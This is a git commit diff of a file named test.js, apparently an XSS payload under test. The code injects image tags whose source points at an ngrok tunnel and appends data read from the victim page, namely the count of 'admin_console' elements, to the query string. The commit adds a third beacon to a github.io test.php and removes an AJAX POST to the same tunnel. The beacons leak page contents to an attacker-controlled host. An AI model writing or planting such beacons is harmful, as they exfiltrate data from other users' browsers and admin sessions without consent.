560d9d8603dc3d315ec41792ae878afc3410f58c
phulelouch <62769629+phulelouch@users.noreply.github.com>
2020-05-24 13:52:49 -0400

    Update test.js

--- test.js
+++ test.js
@@ -9,21 +9,13 @@ function addTheImage2() {
     img.src = "http://3e6850f2.ngrok.io?c="+document.getElementsByClassName("col-8 admin_console").length;
     document.body.appendChild(img);
 }
+
+function addTheImage3() {
+    var img = document.createElement('img');
+    img.src = "phulelouch.github.io/test.php"
+    document.body.appendChild(img);
+}
 addTheImage();
 addTheImage2();
-function add(){
-
-            
-            $('#responseAlert').css('display','none');
-            $('#report').on('click',function(e){
-                $.ajax({
-                    type: "POST",
-                    url: "http://3e6850f2.ngrok.io",
-                    success: function(resp) {
-                        $("#responseAlert").text(resp); $("#responseAlert").css("display","");
-                    }
-                })
-            });
-}
-add();
+addTheImage3();
 
